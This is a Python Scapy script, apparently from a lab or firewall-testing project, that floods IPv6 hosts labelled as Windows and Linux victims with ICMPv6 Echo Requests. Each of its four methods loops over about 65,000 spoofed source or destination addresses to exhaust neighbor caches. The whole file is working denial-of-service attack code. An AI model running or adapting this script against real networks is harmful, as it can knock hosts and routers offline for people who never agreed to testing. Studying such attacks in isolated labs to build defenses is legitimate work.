#!/usr/bin/python

from scapy.all import *



"""
the class build Echo Request messages
"""
class EchoRequest:
    
    def __init__(self):
        print 'Echo Request'
        self.win = "2001:abcd:acad:2:b485:2aec:9447:fd83"
        self.linux = "2001:abcd:acad:2:a00:27ff:fe84:bb37"
        self.attacker = "2001:abcd:acad:1::2"
        self.firewall = "2001:abcd:acad:2::1"

    def buildPacketEchoRequest(self, dst, src):
        data = "abcdefghijklmnopqrstuvwabcdefghi"
        return IPv6(dst=dst,src=src)/ICMPv6EchoRequest()/data
    

    def execModuleEchoRequestNeighCacheExhaustionDstVictimWin(self, exitIface):
        start = 0x0001
        end = 0xffff
        for t in xrange(start, end):
            hex16 = '{:04x}'.format(t)
            src = "2001:abcd:acad:2::" + hex16[:4]
            packetContainer = self.buildPacketEchoRequest(self.win, src)
            send(packetContainer, iface=exitIface, verbose=False)

    def execModuleEchoRequestNeighCacheExhaustionDstVictimLinux(self, exitIface):
        start = 0x0001
        end = 0xffff
        for t in xrange(start, end):
            hex16 = '{:04x}'.format(t)
            src = "2001:abcd:acad:2::" + hex16[:4]
            packetContainer = self.buildPacketEchoRequest(self.linux, src)
            send(packetContainer, iface=exitIface, verbose=False)

    def execModuleEchoRequestNeighCacheExhaustionSrcVictimWin(self, exitIface):
        start = 0x0001
        end = 0xffff
        for t in xrange(start, end):
            hex16 = '{:04x}'.format(t)
            src = "2001:abcd:acad:2::" + hex16[:4]
            packetContainer = self.buildPacketEchoRequest(src, self.win)
            send(packetContainer, iface=exitIface, verbose=False)

    def execModuleEchoRequestNeighCacheExhaustionSrcVictimLinux(self, exitIface):
        start = 0x0001
        end = 0xffff
        for t in xrange(start, end):
            hex16 = '{:04x}'.format(t)
            src = "2001:abcd:acad:2::" + hex16[:4]
            packetContainer = self.buildPacketEchoRequest(src, self.linux)
            send(packetContainer, iface=exitIface, verbose=False)
